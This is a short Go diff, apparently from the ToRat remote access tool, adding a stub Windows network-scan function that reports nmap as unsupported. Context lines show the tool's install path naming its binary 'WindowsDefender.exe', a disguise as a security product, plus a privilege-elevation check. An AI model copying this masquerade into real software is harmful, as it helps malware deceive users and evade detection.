@@ -15,6 +15,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/shred"
 	"golang.org/x/sys/windows/registry"
 )
@@ -24,6 +25,14 @@ var (
 	PathExe      = filepath.Join(Path, "WindowsDefender.exe")
 	HostnamePath = filepath.Join(Path, "token")
 )
+
+func NmapLocalScan(v shared.Void, r *shared.NmapLocal) {
+	r.Scan = "Nmap on Windows is NOT supported yet!"
+	r.Range = GetLocalRange()
+	r.TimeElapsed = 0
+	r.Hosts = 0
+	return
+}
 
 // CheckElevate checks whether the current process has administrator
 // privileges
